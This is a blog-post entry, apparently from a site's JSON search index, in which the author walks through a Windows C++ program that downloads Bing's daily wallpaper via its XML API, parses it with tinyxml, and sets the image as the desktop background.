    "tags": "C/C++, Qt, Windows",
    "date": "2020-11-28 20:33:00 +0900",
    





    
    "snippet": "How does it works​\tIt will download a XML file contains the API of www.bing.com, and then, I use tinyxml to parse the file to obtain the full URL-path of the daily wallpaper. Finally, the wallpaper...",
    "content": "How does it works​\tIt will download a XML file contains the API of www.bing.com, and then, I use tinyxml to parse the file to obtain the full URL-path of the daily wallpaper. Finally, the wallpaper will be download and set as the background.DetailsPlatform:  Windows 7  Visual Studio 2019(Preview)  Old damn computer &amp; sh*t mouse &amp; dusty keyboard​\tWhat’s the local of the wallpaper? After Googling, I get this: “https://www.bing.com/HPImageArchive.aspx?format=xml&amp;idx=0&amp;n=1&amp;mkt=en-US”. That’s important, the full URL is contained in this file. Take a look at the label &lt;image&gt;&lt;url&gt;&lt;/url&gt;&lt;/image&gt;, it’s the part of the full path, just cat \"www.bing.com\" with it, you will obtain the full path.​\tSo, we should download the XML and try to parse it. We require URLDownloadToFile() to download remote files:string xml_url = \"https://cn.bing.com/HPImageArchive.aspx?format=xml&amp;idx=0&amp;n=1\";size_t len = xml_url.length();int nmlen = MultiByteToWideChar(CP_ACP, 0, xml_url.c_str(), len + 1, NULL, 0);wchar_t* buffer = new wchar_t[nmlen];MultiByteToWideChar(CP_ACP, 0, xml_url.c_str(), len + 1, buffer, nmlen);HRESULT hr = URLDownloadToFile(NULL, buffer, _T(\"C:\\\\Program Files\\\\The0d0re C00per\\\\Bing Backgrouds\\\\XML\\\\INDEX.xml\"), 0, NULL);if (hr == S_OK){    cout &lt;&lt; \"Download XML -----------------&gt; DONE\" &lt;&lt; endl;    get_pic_url();}else{    std::cout &lt;&lt; \"Xml download failed!Please check whether the network connection is normal!\" &lt;&lt; std::endl;    MessageBoxA(NULL, \"Xml download failed!Please check whether the network connection is normal!\", \"WARNING!\", MB_OK);}​​\tNext, the program should know where &lt;image&gt;&lt;url&gt;&lt;/url&gt;&lt;/image&gt; is and what’s in this label. I use tinyxml to make it (more about tinyxml).TiXmlDocument doc;const char* xmlFile = \"C:\\\\Program Files\\\\The0d0re C00per\\\\Bing Backgrouds\\\\XML\\\\INDEX.xml\";if (doc.LoadFile(xmlFile)){\tcout &lt;&lt; \"Load file -----------------&gt; DONE\" &lt;&lt; endl;}else {    cout &lt;&lt; \"Can not parse xml!!\" &lt;&lt; endl;    MessageBoxA(NULL, \"Can not parse xml!! Please restart the program and try again!!\", \"WARNING!\", MB_OK);}TiXmlElement* images = doc.RootElement();TiXmlElement* image = images-&gt;FirstChildElement(\"image\");string WebPicturedomain = \"http://www.bing.com\";string WebPictureUrl = \"\";if (image != NULL)    WebPictureUrl = image-&gt;FirstChildElement(\"url\")-&gt;GetText();string WebPictureFullpath = WebPicturedomain + WebPictureUrl;cout &lt;&lt; \"Today Wallpaper Url Successful analysis!\" &lt;&lt; std::endl;cout &lt;&lt; \"The address is:\" &lt;&lt; std::endl;cout &lt;&lt; WebPictureFullpath &lt;&lt; std::endl;​​\tURLDownloadToFile() again to download the wallpaper…string pic_url = WebPictureFullpath;size_t len0 = pic_url.length();int nmlen0 = MultiByteToWideChar(CP_ACP, 0, pic_url.c_str(), len0 + 1, NULL, 0);wchar_t* buffer0 = new wchar_t[nmlen0];MultiByteToWideChar(CP_ACP, 0, pic_url.c_str(), len0 + 1, buffer0, nmlen0);HRESULT hr0 = URLDownloadToFile(NULL, buffer0, _T(\"C:\\\\Program Files\\\\The0d0re C00per\\\\Bing Backgrouds\\\\PIC\\\\Today Wallpaper.png\"), 0, NULL);if (hr0 == S_OK){    cout &lt;&lt; \"Wallpaper Successfully Download!!!\" &lt;&lt; std::endl;}else{    std::cout &lt;&lt; \"Wallpaper download failed!Please check whether the network connection is normal!\" &lt;&lt; std::endl;    MessageBoxA(NULL, \"Wallpaper download failed!Please check whether the network connection is normal!\", \"WARNING!\", MB_OK);}Finally, it’s time to set wallpaper as the background!!! I wrote a function:int ApplyWallpaper(const char* szFileDir, int displayStyle){    WCHAR wsz[MAX_PATH];    MultiByteToWideChar(        CP_ACP,        0,        szFileDir,        -1,        wsz,        MAX_PATH    );    CoInitialize(NULL);    std::wstring x = wsz;    DWORD dwStyle = displayStyle;    HRESULT hr;    IActiveDesktop* pIAD;    hr = CoCreateInstance(CLSID_ActiveDesktop, NULL, CLSCTX_INPROC_SERVER,        IID_IActiveDesktop, (void**)&amp;pIAD);    if (!SUCCEEDED(hr))    {        int errNum = GetLastError();        return errNum;    }    hr = pIAD-&gt;SetWallpaper(x.c_str(), 0);    if (!SUCCEEDED(hr))    {        int errNum = GetLastError();        return errNum;    }        WALLPAPEROPT wpo;    wpo.dwSize = sizeof(wpo);    wpo.dwStyle = dwStyle;    hr = pIAD-&gt;SetWallpaperOptions(&amp;wpo, 0);    if (!SUCCEEDED(hr))    {        int errNum = GetLastError();        return errNum;    }        hr = pIAD-&gt;ApplyChanges(AD_APPLY_ALL);        if (!SUCCEEDED(hr))    {        int errNum = GetLastError();        return errNum;    }        pIAD-&gt;Release();    CoUninitialize();        return TRUE;}/*if (ApplyWallpaper(\"C:\\\\Program Files\\\\The0d0re C00per\\\\Bing Backgrouds\\\\PIC\\\\Today Wallpaper.png\", 0)){\tstd::cout &lt;&lt; \"Wallpaper Set!!\" &lt;&lt; std::endl;    MessageBoxA(NULL, \"Wallpaper Set!!\", \"Bing Backgrounds Getter\", MB_OK);}else{\tstd::cout &lt;&lt; \"Failed to Set Wallpaper!!\" &lt;&lt; std::endl;    MessageBoxA(NULL, \"Failed to Set Wallpaper!!\", \"WARNING!\", MB_OK);}*/Source code  You can find the source code or installer on my Github.Linux…—————Coming soon…"
  }
  
]

